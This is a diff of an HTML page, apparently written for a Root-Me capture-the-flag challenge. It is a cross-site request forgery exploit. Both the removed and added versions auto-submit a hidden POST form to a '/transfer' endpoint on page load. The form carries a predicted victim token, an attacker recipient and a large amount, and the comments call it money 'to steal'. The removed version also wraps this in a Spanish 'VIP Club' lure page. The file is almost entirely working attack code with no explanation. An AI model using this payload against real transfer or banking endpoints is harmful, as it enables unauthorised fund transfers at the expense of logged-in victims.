@@ -1,21 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Oferta Exclusiva</title>
-</head>
 <body>
-    <h1>¡Has sido invitado al Club VIP!</h1>
-    <p>Cargando los beneficios...</p>
-
-    <form id="csrf-form" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST">
-        <input type="hidden" name="token" value="698055634300bf0200000001" /> 
-        <input type="hidden" name="recipient" value="test" />
-        <input type="hidden" name="amount" value="1000000" />
-    </form>
-
     <script>
-        // El script envía el formulario automáticamente en cuanto carga la página
-        document.getElementById('csrf-form').submit();
+        // Usamos un formulario dinámico para asegurar el envío
+        var b = document.createElement("form");
+        b.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
+        b.method = "POST";
+        
+        // Datos del ataque
+        var fields = {
+            "token": "6594d3fb4300bf02000000", // Token predicho de the_dwalt00ns
+            "recipient": "test",             // TU usuario
+            "amount": "100000000"           // Cantidad a robar
+        };
+
+        for (var key in fields) {
+            var input = document.createElement("input");
+            input.type = "hidden";
+            input.name = key;
+            input.value = fields[key];
+            b.appendChild(input);
+        }
+
+        document.body.appendChild(b);
+        b.submit();
     </script>
 </body>
 </html>
